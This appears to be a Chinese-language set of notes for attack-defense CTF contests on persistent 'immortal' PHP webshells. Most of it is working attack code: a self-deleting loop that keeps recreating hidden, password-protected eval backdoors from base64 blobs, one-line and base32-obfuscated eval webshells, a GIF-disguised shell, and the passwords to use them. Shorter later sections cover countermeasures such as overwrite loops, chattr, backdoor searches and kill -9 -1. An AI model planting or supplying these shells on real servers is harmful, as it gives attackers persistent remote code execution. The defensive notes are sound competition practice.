# 不死马



```php
file_put_contents('/var/www/html/images/.1ndex.php',base64_decode('PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwpjaG1vZCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10sIDA3NzcpOwp1bmxpbmsoX19GSUxFX18pOwp3aGlsZSgxKXsgICAKICAgIHVzbGVlcCg1MDAwKTsKICAgIGlmKGZpbGVfZXhpc3RzKCcuZHIwcDMucGhwJykpewogICAgfWVsc2V7CiAgZmlsZV9wdXRfY29udGVudHMoJy5kcjBwMy5waHAnLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnYVdZb2JXUTFLQ1JmVUU5VFZGc2ljR0Z6Y3lKZEtUMDlJamRqTW1RelpUQmlNVEZoWVRJMU1UY3pZVEl3TURneU5qUTBNV1UwTXpneElpbDdRR1YyWVd3b0pGOVFUMU5VV3pGZEtUdDlQejQ9JykpOwogICAgfQogICAgaWYoZmlsZV9leGlzdHMoJy5jb25mMWcucGhwJykpewogICAgfWVsc2V7CiAgZmlsZV9wdXRfY29udGVudHMoJy5jb25mMWcucGhwJyxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBZ2FXWW9jM1ZpYzNSeUtHMWtOU2hBSkY5U1JWRlZSVk5VV3lKcklsMHBMREkxS1QwOUlqUXhaVFF6T0RFaUtYdEFaWFpoYkNna1gxQlBVMVJiWVYwcE8zMGcnKSk7CiAgICB9Cn0KPz4='));
```

在访问`/var/www/html/images/.1ndex.php`   即可种上不死马！🐔

```php
<?php
set_time_limit(0);
ignore_user_abort(1);
chmod($_SERVER['SCRIPT_FILENAME'], 0777);
unlink(__FILE__);
while(1){   
    usleep(5000);
    if(file_exists('.dr0p3.php')){
    }else{
  file_put_contents('.dr0p3.php',base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsicGFzcyJdKT09IjdjMmQzZTBiMTFhYTI1MTczYTIwMDgyNjQ0MWU0MzgxIil7QGV2YWwoJF9QT1NUWzFdKTt9Pz4='));
    }
    if(file_exists('.conf1g.php')){
    }else{
  file_put_contents('.conf1g.php',base64_decode('PD9waHAgaWYoc3Vic3RyKG1kNShAJF9SRVFVRVNUWyJrIl0pLDI1KT09IjQxZTQzODEiKXtAZXZhbCgkX1BPU1RbYV0pO30g'));
    }
}
?>
```

base64那串是

```php
<?php if(md5($_POST["pass"])=="7c2d3e0b11aa25173a200826441e4381"){@eval($_POST[1]);}?>
```

密码为

```
Dropsec_upload
```

```
<?php if(substr(md5(@$_REQUEST["k"]),25)=="41e4381"){@eval($_POST[a]);} 
```



shell！

```
GIF89a
<script language='php'>
@eval($_POST['c']);
phpinfo();
</script>
```

```
<?=@eval($_POST['c']);
```

```php
<?php
class KUYE{
    public $DAXW = null;
    public $LRXV = null;
    function __construct(){
        $this->DAXW = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->LRXV = @SYXJ($this->DAXW);
        echo $this->LRXV;
        @eval("/*GnSpe=u*/".$this->LRXV."/*GnSpe=u*/");
    }}
new KUYE();
function MNWK($QSFX){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $NLHB = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($QSFX); $i < $j; $i++){
        $v <<= 8;
        $v += ord($QSFX[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $NLHB .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $NLHB .= $BASE32_ALPHABET[$v];}
    return $NLHB;}
function SYXJ($QSFX){
    $NLHB = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($QSFX); $i < $j; $i++){
        $v <<= 5;
        if ($QSFX[$i] >= 'a' && $QSFX[$i] <= 'z'){
            $v += (ord($QSFX[$i]) - 97);
        } elseif ($QSFX[$i] >= '2' && $QSFX[$i] <= '7') {
            $v += (24 + $QSFX[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $NLHB .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $NLHB;}
?>
```

上面的是：

```
eval($_POST[zero]);
```



```php
<?php class KUYE{public$DAXW=null;public$LRXV=null;function __construct(){$this->DAXW='mv3gc3bierpvat2tkrnxuzlsn5ossoy';$this->DAXW2='mv3gc3bierdadadsoomselseaqxxsy';$this->LRXV2=@SYXJ($this->DAXW2);$this->LRXV=@SYXJ($this->DAXW);if(md5($_POST["pass"])=="e10adc3949ba59abbe56e057f20f883e"){@eval("/*GnSpe=u*/".$this->LRXV2."/*GnSpe=u*/");}if(md5($_POST["username"])=="7c2d3e0b11aa25173a200826441e4381"){@eval("/*GnSpe=u*/".$this->LRXV."/*GnSpe=u*/");}}}new KUYE();function MNWK($QSFX){$BASE32_ALPHABET='abcdefghijklmnopqrstuvwxyz234567';$NLHB='';$v=0;$vbits=0;for($i=0,$j=strlen($QSFX);$i<$j;$i++){$v<<=8;$v+=ord($QSFX[$i]);$vbits+=8;while($vbits>=5){$vbits-=5;$NLHB.=$BASE32_ALPHABET[$v>>$vbits];$v&=((1<<$vbits)-1);}}if($vbits>0){$v<<=(5-$vbits);$NLHB.=$BASE32_ALPHABET[$v];}return$NLHB;}function SYXJ($QSFX){$NLHB='';$v=0;$vbits=0;for($i=0,$j=strlen($QSFX);$i<$j;$i++){$v<<=5;if($QSFX[$i]>='a'&&$QSFX[$i]<='z'){$v+=(ord($QSFX[$i])-97);}elseif($QSFX[$i]>='2'&&$QSFX[$i]<='7'){$v+=(24+$QSFX[$i]);}else{exit(1);}$vbits+=5;while($vbits>=8){$vbits-=8;$NLHB.=chr($v>>$vbits);$v&=((1<<$vbits)-1);}}return$NLHB;}
```

![image-20211029134731515](https://gitee.com/taochiyu/blogimage/raw/master/img/20211029134738.png)

```
pass=Dropsec_upload&zero=phpinfo();
```



## 自创写不死马

```php
<?php
set_time_limit(0);
ignore_user_abort(1);
chmod($_SERVER['SCRIPT_FILENAME'], 0777);
unlink(__FILE__);
while(1){   
    usleep(5000);
    if(file_exists('.dr0p3.php')){
    }else{
  file_put_contents('.dr0p3.php',base64_decode('PD9waHAgY2xhc3MgS1VZRXtwdWJsaWMkREFYVz1udWxsO3B1YmxpYyRMUlhWPW51bGw7ZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+REFYVz0nbXYzZ2MzYmllcnB2YXQydGtybnh1emxzbjVvc3NveSc7JHRoaXMtPkRBWFcyPSdtdjNnYzNiaWVyZGFkYWRzb29tc2Vsc2VhcXh4c3knOyR0aGlzLT5MUlhWMj1AU1lYSigkdGhpcy0+REFYVzIpOyR0aGlzLT5MUlhWPUBTWVhKKCR0aGlzLT5EQVhXKTtpZihtZDUoJF9QT1NUWyJwYXNzIl0pPT0iZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UiKXtAZXZhbCgiLypHblNwZT11Ki8iLiR0aGlzLT5MUlhWMi4iLypHblNwZT11Ki8iKTt9aWYobWQ1KCRfUE9TVFsidXNlcm5hbWUiXSk9PSI3YzJkM2UwYjExYWEyNTE3M2EyMDA4MjY0NDFlNDM4MSIpe0BldmFsKCIvKkduU3BlPXUqLyIuJHRoaXMtPkxSWFYuIi8qR25TcGU9dSovIik7fX19bmV3IEtVWUUoKTtmdW5jdGlvbiBNTldLKCRRU0ZYKXskQkFTRTMyX0FMUEhBQkVUPSdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejIzNDU2Nyc7JE5MSEI9Jyc7JHY9MDskdmJpdHM9MDtmb3IoJGk9MCwkaj1zdHJsZW4oJFFTRlgpOyRpPCRqOyRpKyspeyR2PDw9ODskdis9b3JkKCRRU0ZYWyRpXSk7JHZiaXRzKz04O3doaWxlKCR2Yml0cz49NSl7JHZiaXRzLT01OyROTEhCLj0kQkFTRTMyX0FMUEhBQkVUWyR2Pj4kdmJpdHNdOyR2Jj0oKDE8PCR2Yml0cyktMSk7fX1pZigkdmJpdHM+MCl7JHY8PD0oNS0kdmJpdHMpOyROTEhCLj0kQkFTRTMyX0FMUEhBQkVUWyR2XTt9cmV0dXJuJE5MSEI7fWZ1bmN0aW9uIFNZWEooJFFTRlgpeyROTEhCPScnOyR2PTA7JHZiaXRzPTA7Zm9yKCRpPTAsJGo9c3RybGVuKCRRU0ZYKTskaTwkajskaSsrKXskdjw8PTU7aWYoJFFTRlhbJGldPj0nYScmJiRRU0ZYWyRpXTw9J3onKXskdis9KG9yZCgkUVNGWFskaV0pLTk3KTt9ZWxzZWlmKCRRU0ZYWyRpXT49JzInJiYkUVNGWFskaV08PSc3Jyl7JHYrPSgyNCskUVNGWFskaV0pO31lbHNle2V4aXQoMSk7fSR2Yml0cys9NTt3aGlsZSgkdmJpdHM+PTgpeyR2Yml0cy09ODskTkxIQi49Y2hyKCR2Pj4kdmJpdHMpOyR2Jj0oKDE8PCR2Yml0cyktMSk7fX1yZXR1cm4kTkxIQjt9'));
    }
    if(file_exists('.conf1g.php')){
    }else{
  file_put_contents('.conf1g.php',base64_decode('PD9waHAgaWYoc3Vic3RyKG1kNShAJF9SRVFVRVNUWyJrIl0pLDI1KT09IjQxZTQzODEiKXtAZXZhbCgkX1BPU1RbYV0pO30g'));
    }
}
?>
```



```
.conf1g.php  <?php if(substr(md5(@$_REQUEST["k"]),25)=="41e4381"){@eval($_POST[a]);} 
mm :  k=Dropsec_upload&a=phpinfo();
```



```
.dr0p3.php username=Dropsec_upload&zero=phpinfo();
```



## 上不死马

```php
file_put_contents('/var/www/html/images/.1ndex.php',base64_decode('PD9waHANCnNldF90aW1lX2xpbWl0KDApOw0KaWdub3JlX3VzZXJfYWJvcnQoMSk7DQpjaG1vZCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10sIDA3NzcpOw0KdW5saW5rKF9fRklMRV9fKTsNCndoaWxlKDEpeyAgIA0KICAgIHVzbGVlcCg1MDAwKTsNCiAgICBpZihmaWxlX2V4aXN0cygnLmRyMHAzLnBocCcpKXsNCiAgICB9ZWxzZXsNCiAgZmlsZV9wdXRfY29udGVudHMoJy5kcjBwMy5waHAnLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnWTJ4aGMzTWdTMVZaUlh0d2RXSnNhV01rUkVGWVZ6MXVkV3hzTzNCMVlteHBZeVJNVWxoV1BXNTFiR3c3Wm5WdVkzUnBiMjRnWDE5amIyNXpkSEoxWTNRb0tYc2tkR2hwY3kwK1JFRllWejBuYlhZeloyTXpZbWxsY25CMllYUXlkR3R5Ym5oMWVteHpialZ2YzNOdmVTYzdKSFJvYVhNdFBrUkJXRmN5UFNkdGRqTm5Zek5pYVdWeVpHRmtZV1J6YjI5dGMyVnNjMlZoY1hoNGMza25PeVIwYUdsekxUNU1VbGhXTWoxQVUxbFlTaWdrZEdocGN5MCtSRUZZVnpJcE95UjBhR2x6TFQ1TVVsaFdQVUJUV1ZoS0tDUjBhR2x6TFQ1RVFWaFhLVHRwWmlodFpEVW9KRjlRVDFOVVd5SndZWE56SWwwcFBUMGlaVEV3WVdSak16azBPV0poTlRsaFltSmxOVFpsTURVM1pqSXdaamc0TTJVaUtYdEFaWFpoYkNnaUx5cEhibE53WlQxMUtpOGlMaVIwYUdsekxUNU1VbGhXTWk0aUx5cEhibE53WlQxMUtpOGlLVHQ5YVdZb2JXUTFLQ1JmVUU5VFZGc2lkWE5sY201aGJXVWlYU2s5UFNJM1l6SmtNMlV3WWpFeFlXRXlOVEUzTTJFeU1EQTRNalkwTkRGbE5ETTRNU0lwZTBCbGRtRnNLQ0l2S2tkdVUzQmxQWFVxTHlJdUpIUm9hWE10UGt4U1dGWXVJaThxUjI1VGNHVTlkU292SWlrN2ZYMTlibVYzSUV0VldVVW9LVHRtZFc1amRHbHZiaUJOVGxkTEtDUlJVMFpZS1hza1FrRlRSVE15WDBGTVVFaEJRa1ZVUFNkaFltTmtaV1puYUdscWEyeHRibTl3Y1hKemRIVjJkM2g1ZWpJek5EVTJOeWM3SkU1TVNFSTlKeWM3SkhZOU1Ec2tkbUpwZEhNOU1EdG1iM0lvSkdrOU1Dd2thajF6ZEhKc1pXNG9KRkZUUmxncE95UnBQQ1JxT3lScEt5c3BleVIyUER3OU9Ec2tkaXM5YjNKa0tDUlJVMFpZV3lScFhTazdKSFppYVhSekt6MDRPM2RvYVd4bEtDUjJZbWwwY3o0OU5TbDdKSFppYVhSekxUMDFPeVJPVEVoQ0xqMGtRa0ZUUlRNeVgwRk1VRWhCUWtWVVd5UjJQajRrZG1KcGRITmRPeVIySmowb0tERThQQ1IyWW1sMGN5a3RNU2s3ZlgxcFppZ2tkbUpwZEhNK01DbDdKSFk4UEQwb05TMGtkbUpwZEhNcE95Uk9URWhDTGowa1FrRlRSVE15WDBGTVVFaEJRa1ZVV3lSMlhUdDljbVYwZFhKdUpFNU1TRUk3ZldaMWJtTjBhVzl1SUZOWldFb29KRkZUUmxncGV5Uk9URWhDUFNjbk95UjJQVEE3SkhaaWFYUnpQVEE3Wm05eUtDUnBQVEFzSkdvOWMzUnliR1Z1S0NSUlUwWllLVHNrYVR3a2Fqc2thU3NyS1hza2RqdzhQVFU3YVdZb0pGRlRSbGhiSkdsZFBqMG5ZU2NtSmlSUlUwWllXeVJwWFR3OUozb25LWHNrZGlzOUtHOXlaQ2drVVZOR1dGc2thVjBwTFRrM0tUdDlaV3h6WldsbUtDUlJVMFpZV3lScFhUNDlKekluSmlZa1VWTkdXRnNrYVYwOFBTYzNKeWw3SkhZclBTZ3lOQ3NrVVZOR1dGc2thVjBwTzMxbGJITmxlMlY0YVhRb01TazdmU1IyWW1sMGN5czlOVHQzYUdsc1pTZ2tkbUpwZEhNK1BUZ3BleVIyWW1sMGN5MDlPRHNrVGt4SVFpNDlZMmh5S0NSMlBqNGtkbUpwZEhNcE95UjJKajBvS0RFOFBDUjJZbWwwY3lrdE1TazdmWDF5WlhSMWNtNGtUa3hJUWp0OScpKTsNCiAgICB9DQogICAgaWYoZmlsZV9leGlzdHMoJy5jb25mMWcucGhwJykpew0KICAgIH1lbHNlew0KICBmaWxlX3B1dF9jb250ZW50cygnLmNvbmYxZy5waHAnLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnYVdZb2MzVmljM1J5S0cxa05TaEFKRjlTUlZGVlJWTlVXeUpySWwwcExESTFLVDA5SWpReFpUUXpPREVpS1h0QVpYWmhiQ2drWDFCUFUxUmJZVjBwTzMwZycpKTsNCiAgICB9DQp9DQo/Pg=='));
```



访问：

```
.1ndex.php
```

当前目录下生成：

```
.conf1g.php k=Dropsec_upload&a=phpinfo();
.dr0p3.php  username=Dropsec_upload&zero=phpinfo();
```







## 查找最新文件

```
find *.php -mmin -10
```



## 杀不死马

### 条件竞争 删除

```php
<?php
set_time_limit(0);
ignore_user_abort(1);
while(1){
    @unlink('.daidaiwo.php');
}
?>
```

写到web目录 访问下



## 杀不死马2

### 条件竞争 重写  更有效

```php
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.3.php';
    $code = 'hi springbird !';
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
    //    usleep(5000);
          usleep(1000);
    }
?>
```



```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.dr0p3.php';
$code = 'flag{k9oct67wctkmbsdkhi32yiip7s223uasv}';
$file1 = '.conf1g.php';
$code1 = 'flag{XWO4MO2HJS5W0HADZbsdkha115ac9v49}';
//pass=pass
while (1){
    file_put_contents($file,$code);
    file_put_contents($file1,$code1);
    //    usleep(5000);
    usleep(1000);
}
?>
```



但是有时候没有file_put_contents没有权限！这时后就用我们自己的shell传！ 着是错误的！ 可能我的测试环境不行！ 一般都可以写！

```
file_put_contents('/var/www/html/images/.1ndex.php',base64_decode('PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuZHIwcDMucGhwJzsKJGNvZGUgPSAnZmxhZ3trOW9jdDY3d2N0a21ic2RraGkzMnlpaXA3czIyM3Vhc3YxMTExMTExMTExMTExMTExMX0nOwokZmlsZTEgPSAnLmNvbmYxZy5waHAnOwokY29kZTEgPSAnZmxhZ3tYV080TU8ySEpTNVcwSEFEWmJzZGtoYTExNWFjOXY0OTIyMjIyMjIyMjJ9JzsKLy9wYXNzPXBhc3MKd2hpbGUgKDEpewogICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUxLCRjb2RlMSk7CiAgICAvLyAgICB1c2xlZXAoNTAwMCk7CiAgICB1c2xlZXAoMTAwMCk7Cn0KPz4='));
```



## 后台运行

```
在Linux中，如果要让进程在后台运行，一般情况下，我们在命令后面加上&即可，实际上，这样是将命令放入到一个作业队列中了：

php 111.php &
```



### 改权限(待测)

```bash
echo 0 > .dr0p3.php;chattr +i .dr0p3.php
```

### 创建目录

创建一个和不死马文件相同的目录

````bash
rm .dr0p3.php;mkdir .dr0p3.php
````

## 快速查找后门

### 软连接

查找所有软连接判断其指向

```bash
ls -al $(find . -type l)
```

创建软连接

```bash
ln -s /flag ./backup/.dr0p3
```

### 查找关键字

查找flag

```bash
grep "/flag" -r . 2>/dev/null
```







# 删除不死马

```
第二种方法就是用命令将在内存中的进程删除；

kill -9 -1
这个命令可以杀掉当前用户下面的所有进程，当然就可以把不死马杀掉。
```

